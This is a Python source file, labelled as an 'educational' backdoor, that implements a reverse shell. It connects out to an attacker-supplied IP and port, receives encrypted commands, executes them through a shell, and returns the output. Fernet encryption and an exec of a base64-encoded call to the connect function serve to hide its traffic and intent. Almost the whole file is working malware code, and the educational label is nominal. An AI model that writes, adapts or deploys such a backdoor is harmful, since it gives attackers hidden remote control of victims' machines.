##
## crappiest and best backdoor for educational purposes ~~porpoises~~ 
##

import socket
import subprocess
import os
import base64
import json
from cryptography.fernet import Fernet

# Generate a key for encryption (do this once and store it securely)
# key = Fernet.generate_key()
# print(key.decode())  # Save this key securely
key = b'your_generated_key_here'  # Replace with your actual key
cipher = Fernet(key)

# Function to encrypt data
def encrypt(data):
    return cipher.encrypt(data.encode()).decode()

# Function to decrypt data
def decrypt(data):
    return cipher.decrypt(data.encode()).decode()

# Function to connect back to the attacker's machine
def connect_back():
    # Replace <YOUR_IP> and <YOUR_PORT> with your attacker's IP and port
    server_ip = "<YOUR_IP>"
    server_port = <YOUR_PORT>
    
    # Create a socket connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server_ip, server_port))
    
    # Redirect input/output
    while True:
        # Receive encrypted command from the attacker
        encrypted_command = s.recv(1024).decode()
        if not encrypted_command:
            break
        
        # Decrypt the command
        command = decrypt(encrypted_command)
        
        if command.lower() == 'exit':
            break
        
        # Execute the command and send back the results
        if command.startswith("cd "):
            try:
                os.chdir(command.strip("cd "))
                s.send(encrypt("Changed directory").encode())
            except FileNotFoundError as e:
                s.send(encrypt(str(e)).encode())
        else:
            output = subprocess.run(command, shell=True, capture_output=True)
            result = output.stdout + output.stderr
            s.send(encrypt(result.decode()).encode())

    s.close()

# Obfuscation: Base64 encode the function and decode it before execution
encoded_function = "Y29ubmVjdF9iYWNrKA=="
exec(base64.b64decode(encoded_function).decode('utf-8'))

##
##
